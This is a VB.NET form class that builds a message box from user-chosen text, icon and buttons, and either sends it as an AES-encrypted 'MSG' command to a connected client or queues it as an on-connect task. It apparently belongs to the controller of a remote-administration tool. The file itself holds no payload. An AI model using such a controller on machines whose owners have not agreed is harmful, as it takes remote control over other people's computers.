Public Class ShowMsgBox
    Public calledfromuserinput As Boolean = False
    Public connected As Connection
    Function MessageBoxButton(ByVal Text As String)
        Select Case Text
            Case "AbortRetryIgnore"
                Return MessageBoxButtons.AbortRetryIgnore
            Case "OK"
                Return MessageBoxButtons.OK
            Case "OKCancel"
                Return MessageBoxButtons.OKCancel
            Case "RetryCancel"
                Return MessageBoxButtons.RetryCancel
            Case "YesNo"
                Return MessageBoxButtons.YesNo
            Case "YesNoCancel"
                Return MessageBoxButtons.YesNoCancel
            Case Else
                Return MessageBoxButtons.OK
        End Select
    End Function
    Function MessageBoxIcn(ByVal text As String)
        Select Case text
            Case "Asterisk"
                Return MessageBoxIcon.Asterisk
            Case "Error"
                Return MessageBoxIcon.Error
            Case "Exclamation"
                Return MessageBoxIcon.Exclamation
            Case "Hand"
                Return MessageBoxIcon.Hand
            Case "Information"
                Return MessageBoxIcon.Information
            Case "None"
                Return MessageBoxIcon.None
            Case "Question"
                Return MessageBoxIcon.Question
            Case "Stop"
                Return MessageBoxIcon.Stop
            Case "Warning"
                Return MessageBoxIcon.Warning
            Case Else
                Return MessageBoxIcon.None
        End Select
    End Function
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MessageBox.Show(RichTextBox1.Text, TextBox1.Text, MessageBoxButton(ComboBox2.Text), MessageBoxIcn(ComboBox1.Text))
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If calledfromuserinput = True Then
            connected.Send(New Encryption().AES_Encrypt("MSG" & String.Format("Title: {0} Body: {1} Icon: {2} Button: {3} End", TextBox1.Text, RichTextBox1.Text, MessageBoxIcn(ComboBox1.Text), MessageBoxButton(ComboBox2.Text)), Form1.enckey))
            Me.Close()
        Else
            With Form1.ListViewOnConnect.Items.Add("Show MessageBox")
                .SubItems.Add(String.Format("Title: {0} Body: {1} Icon: {2} Button: {3} End", TextBox1.Text, RichTextBox1.Text, MessageBoxIcn(ComboBox1.Text), MessageBoxButton(ComboBox2.Text)))
                .SubItems.Add("Enabled")
            End With
            Me.Close()
        End If
    End Sub
End Class